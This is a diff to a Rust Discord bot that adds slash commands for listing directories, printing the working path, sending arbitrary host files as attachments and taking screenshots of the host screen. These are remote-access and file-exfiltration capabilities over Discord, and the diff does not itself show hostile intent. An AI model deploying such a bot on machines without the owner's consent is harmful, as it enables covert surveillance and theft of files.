@@ -6,7 +6,7 @@ mod dowithsys;
 use dowithsys::make_screenshot;
 use serde::Deserialize;
 use serde_json;
-use serenity::all::{ CreateAttachment, CreateMessage, GuildId, Ready};
+use serenity::all::{CreateAttachment, CreateMessage, GuildId, Ready};
 use serenity::async_trait;
 use serenity::builder::{CreateInteractionResponse, CreateInteractionResponseMessage};
 use serenity::model::application::Interaction;
@@ -53,15 +53,36 @@ impl EventHandler for Handler {
         if let Interaction::Command(command) = interaction {
             let content = match command.data.name.as_str() {
                 "cd" => Some(commands::cd::run(&command.data.options(), &mut *nowpath)),
-                "ls" => Some(commands::ls::run(&command.data.options(), &mut *nowpath)),
-                "sendfile" => Some(commands::sendfile::run(&command.data.options(), &mut *nowpath)),
-                "ping" => Some(commands::ping::run(&command.data.options())),
+                "ls" => Some(commands::ls::run(&mut *nowpath)),
+                "sendfile" => Some(commands::sendfile::run(
+                    &command.data.options(),
+                    &mut *nowpath,
+                )),
+                "ping_bot" => Some(commands::ping::run()),
+                "pwd" => Some(commands::pwd::run(&mut *nowpath)),
+                "screenshot" => Some(commands::screenshot::run()),
                 _ => Some("not implemented ".to_string()),
             };
             if let Some(content) = content {
                 if command.data.name == "sendfile" {
-                    let p: CreateAttachment = serde_json::from_str(&content).unwrap();
-                    let data = CreateInteractionResponseMessage::new().add_file(p);
+                    if content == "not" {
+                        let data =
+                            CreateInteractionResponseMessage::new().content("Not valid command");
+                        let builder = CreateInteractionResponse::Message(data);
+                        if let Err(why) = command.create_response(&ctx.http, builder).await {
+                            println!("Cannot respond to slash command: {why}");
+                        }
+                    } else {
+                        let p = CreateAttachment::path(content).await.unwrap();
+                        let data = CreateInteractionResponseMessage::new().add_file(p);
+                        let builder = CreateInteractionResponse::Message(data);
+                        if let Err(why) = command.create_response(&ctx.http, builder).await {
+                            println!("Cannot respond to slash command: {why}");
+                        }
+                    }
+                } else if command.data.name == "screenshot" {
+                    let ch = make_screenshot().await;
+                    let data = CreateInteractionResponseMessage::new().add_file(ch);
                     let builder = CreateInteractionResponse::Message(data);
                     if let Err(why) = command.create_response(&ctx.http, builder).await {
                         println!("Cannot respond to slash command: {why}");
@@ -73,7 +94,6 @@ impl EventHandler for Handler {
                         println!("Cannot respond to slash command: {why}");
                     }
                 }
-                
             }
         }
     }
@@ -83,7 +103,14 @@ impl EventHandler for Handler {
         let _commands = guild_id
             .set_commands(
                 &ctx.http,
-                vec![commands::cd::register(), commands::ls::register(), commands::sendfile::register(), commands::ping::register()],
+                vec![
+                    commands::cd::register(),
+                    commands::ls::register(),
+                    commands::sendfile::register(),
+                    commands::ping::register(),
+                    commands::pwd::register(),
+                    commands::screenshot::register(),
+                ],
             )
             .await;
     }
@@ -121,4 +148,3 @@ fn rem_first(value: &str) -> &str {
     chars.next();
     chars.as_str()
 }
-
